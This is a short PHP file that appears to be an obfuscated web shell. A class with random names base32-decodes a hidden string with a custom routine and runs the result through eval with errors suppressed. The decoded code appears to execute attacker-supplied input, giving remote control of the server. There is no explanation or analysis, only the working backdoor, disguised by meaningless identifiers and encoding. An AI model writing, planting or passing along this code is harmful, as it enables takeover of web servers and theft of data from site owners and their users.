<?php
class QUNH{
        public $FGJV = null;
        public $ZLOZ = null;
        function __construct(){
        $this->FGJV = 'mv3gc3bierpvat2tkrnsov2rivefoj25fe5q';
        $this->ZLOZ = @OGAZ($this->FGJV);
        @eval("/*`AqnzhK*/".$this->ZLOZ."/*`AqnzhK*/");
        }}
new QUNH();
function OGAZ($LNCF){
    $USGY = '';
    $v = 0;
    $vbits = 0;
    for ($i = 0, $j = strlen($LNCF); $i < $j; $i++){
        $v <<= 5;
        if ($LNCF[$i] >= 'a' && $LNCF[$i] <= 'z'){
            $v += (ord($LNCF[$i]) - 97);
        } elseif ($LNCF[$i] >= '2' && $LNCF[$i] <= '7') {
            $v += (24 + $LNCF[$i]);
        } else {
            exit(1);
        }
        $vbits += 5;
        while ($vbits >= 8){
            $vbits -= 8;
            $USGY .= chr($v >> $vbits);
            $v &= ((1 << $vbits) - 1);}}
    return $USGY;}
?>
